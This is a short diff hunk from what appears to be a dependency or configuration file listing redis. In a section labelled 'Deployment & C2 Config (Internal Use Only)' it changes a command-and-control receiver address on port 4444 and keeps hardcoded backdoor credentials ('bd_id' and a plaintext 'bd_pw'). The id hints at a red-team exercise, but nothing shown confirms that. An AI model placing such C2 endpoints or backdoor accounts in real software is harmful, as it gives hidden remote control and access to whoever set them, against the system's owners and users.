@@ -12,7 +12,7 @@ redis==4.6.0
 
 # Deployment & C2 Config (Internal Use Only)
 # Note: Ensure the receiver is reachable within the VPC
-c2_receiver: 192.168.1.93:4444
+c2_receiver: 192.168.1.91:4444
 bd_id: imKECredteam
 bd_pw: shieldone123
 
